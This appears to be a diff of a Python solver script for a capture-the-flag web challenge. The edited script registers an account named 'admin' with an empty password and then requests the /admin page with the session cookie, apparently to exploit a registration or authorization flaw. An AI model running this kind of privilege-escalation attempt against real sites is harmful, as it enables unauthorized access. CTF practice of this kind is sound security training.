@@ -5,17 +5,21 @@ from urllib.parse import urljoin
 session = requests.Session()
 url = "http://too-small-reminder.challs.olicyber.it/"
 
-data = {"username": "ka", "password": "ka"}
+data = {"username": "admin", "password": ""}
 
 init = session.get(url)
+print()
+print(init.text)
+
 r = session.post(urljoin(url, "register"), json=data)
 print(r.json())
 
-l = session.post(urljoin(url, "login"), json=data)
-print(l.text)
+#l = session.post(urljoin(url, "login"), json=data)
+#print(l.text)
 
-d = session.get(urljoin(url, "logout"), cookies=l.cookies)
-print(d.text)
+#d = session.get(urljoin(url, "logout"), cookies=session.cookies)
+#print(d.text)
 
-a = session.get(urljoin(url, "admin"), cookies=d.cookies)
+a = session.get(urljoin(url, "admin"), cookies=session.cookies)
 print(a.text)
+    
